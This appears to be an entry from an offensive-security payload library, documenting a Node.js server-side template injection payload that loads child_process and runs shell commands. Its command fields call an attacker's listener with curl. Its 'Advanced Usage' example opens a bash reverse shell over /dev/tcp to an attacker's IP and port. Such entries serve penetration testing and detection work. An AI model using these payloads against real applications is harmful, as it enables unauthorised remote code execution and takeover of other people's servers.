---
data: >-
  process.mainModule.constructor._load('child_process').exec('curl
  http://[ip]:[port]/')
tags:
  - rce
  - nodejs
  - ssti
type: command
executor: javascript
platforms:
  - Node.js
id: dbad93c9-aa56-49af-9363-7983dca771cd
created_at: '2025-12-11T06:10:15.477Z'
updated_at: '2025-12-11T06:10:15.477Z'
verified: false
validated: true
submitted: true
---
# node-ssti-rce-payload

## Command

```javascript
process.mainModule.constructor._load('child_process').exec('curl http://[ip]:[port]/')
```

## Description

This JavaScript payload exploits SSTI in a Node.js environment by loading the child_process module and executing a system command, such as curl, to achieve remote code execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `module` | child_process - loads the Node.js module for spawning child processes | Yes |
| `command` | curl http://[ip]:[port]/ - makes an HTTP request to the attacker's server | Yes |

## Examples

### Basic Usage

```javascript
process.mainModule.constructor._load('child_process').exec('curl http://example.com/')
```

### Advanced Usage

```javascript
process.mainModule.constructor._load('child_process').exec('bash -i >& /dev/tcp/[ip]/[port] 0>&1')
```

## Expected Output

Execution of the curl command, potentially confirming RCE by hitting the attacker's listener with an HTTP request.

## Related

- [[commands/curl-http-request]]
- [[procedures/Exploit-SSTI-for-Remote-Code-Execution]]
